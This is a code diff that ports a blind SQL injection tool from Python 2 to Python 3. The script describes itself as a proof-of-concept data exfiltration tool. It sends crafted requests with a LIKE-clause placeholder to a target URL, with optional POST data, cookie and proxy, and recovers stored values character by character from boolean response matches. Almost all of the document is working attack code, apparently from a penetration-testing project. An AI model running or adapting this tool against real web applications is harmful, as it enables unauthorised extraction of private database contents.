@@ -14,7 +14,7 @@
 import sys
 from itertools import product
 import string
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import argparse
 import requests
 
@@ -29,9 +29,9 @@ def setup(charset):
 	"""
 	S = []
 	for wordchars in product(charset, repeat=1):
-	      S.append(''.join(wordchars))
-	      if(debug):
-		    sys.stdout.write('debug: s is : ' + ''.join(wordchars) + '\n')	      
+		S.append(''.join(wordchars))
+		if(debug):
+			sys.stdout.write('debug: s is : ' + ''.join(wordchars) + '\n')
 	return S
 
 def dblookup(s, match=False):
@@ -58,7 +58,7 @@ def bsqli_lookup(s, match=False):
 	found = False
 	postdata=False
 	wildcard='%'
-	
+
 	if (match):
 		url=args.url.replace('{*}' + wildcard,s)
 		if args.postdata:
@@ -67,13 +67,13 @@ def bsqli_lookup(s, match=False):
 		url=args.url.replace('{*}',s)
 		if args.postdata:
 			postdata=args.postdata.replace('{*}',s)
-	
+
 	(resp)=fetch_url(url, postdata, *args._get_kwargs())
 	found=match_resp(resp,args.match)
-	
+
 	if (debug):
 			  sys.stdout.write('debug: match_resp() Boolean : ' + args.match + ' : ' + str(found) + '\n')
-			  sys.stdout.write('debug: url ' + url)
+			  sys.stdout.write('debug: url ' + url + '\n')
 	return(found)
 
 def brute(S):
@@ -81,10 +81,10 @@ def brute(S):
 	Take S (character set) and attempt to retrieve ALL data through the algorithm below.
 	"""
 	F = []
-        lim = len(S) 
+	lim = len(S) 
 	temp = ''
 	prev_found=False
-	
+
 	if(debug):
 		sys.stdout.write('debug: S{} length is: ' + str(lim) + '\n')
 
@@ -96,11 +96,11 @@ def brute(S):
 				temp +=	S[idx]
 				idx = 0
 				prev_found=False
-				
+
 				if(bsqli_lookup(temp, True)):
 					if (prev_found==False):
 						F.append(temp)
-						print "Interim Report : Found word : " + F[-1]
+						print("Interim Report : Found word : " + F[-1])
 						prev_found=True
 						if (debug):
 							sys.stdout.write('debug: adding to F{}: ' + temp + ' !!!\n')
@@ -116,7 +116,7 @@ def brute(S):
 
 			if(debug):
 				sys.stdout.write('debug: current temp value: ' + temp + '\n');
-				
+
 			if(idx==lim): # 37
 				if(len(temp)>1):
 					#if((S.index(temp[-1])+1) < lim):
@@ -140,29 +140,27 @@ def fetch_url(url, postdata, *kwargs):
 		(key,value) = i
 		if(value):
 			if key.startswith("cookie"): 
-			      H['Cookie']=value
+				H['Cookie']=value
 			if key.startswith("useragent"): 
-			      H['User-Agent']=value
+				H['User-Agent']=value
 			else:
-			      H['User-Agent']='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)'
+				H['User-Agent']='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)'
 			if key.startswith("proxy"):
-			      P['http']=value
-			if (debug):
-				sys.stdout.write('debug: fetchurl key-value pair: ' + key + ': ' + str(value) + '\n')	
-	
+				P['http']=value
+
 	with session as s:
 		if postdata:
 			f=s.post(url, data=postdata, headers=H, proxies=P)
 		else:
 			f=s.get(url, headers=H, proxies=P)
-	
-	resp=str(f.headers)+f.text
-	
+
+	resp=f.text
+
 	if (debug):
+		sys.stdout.write('debug: fetchurl url: ' + url + '\n')
 		sys.stdout.write('debug: fetchurl response code: ' + str(f.status_code) + '\n')
 		sys.stdout.write('debug: fetchurl response headers: ' + str(f.headers) + '\n')
-		sys.stdout.write('debug: fetchurl response data: ' + f.text + '\n')
-	
+
 	return (resp)
 
 def match_resp(hay, needle):
@@ -178,7 +176,7 @@ def match_resp(hay, needle):
 def main():
 	global debug, args, session
 	debug=0
-	
+
 	parser=argparse.ArgumentParser(description='Proof of Concept Blind SQL LIKE CLAUSE Data Exfiltration Tool - what a mouthful!')
 	parser.add_argument('-v', '--verbose', '--debug', action='store_true')
 	parser.add_argument('-u','--url', required=True, help="Add {*} as placeholder for custom SQL LIKE query, see README")
@@ -188,17 +186,17 @@ def main():
 	parser.add_argument('-d','--postdata')
 	parser.add_argument('-m','--match', required=True, help='data to match for Boolean True checks')
 	args=parser.parse_args()
-	
+
 	if args.verbose:
 		debug=True
-	
+
 	session = requests.Session()
-	
+
 	# List of ready made character sets can be easily added to extend charSet
 	# See https://docs.python.org/2/library/string.html#string-constants
-	charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '-'
+	charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '-' + '='
 	S=setup(charset)
 	brute(S)
-        	
+
 if __name__ == "__main__":
 	main()
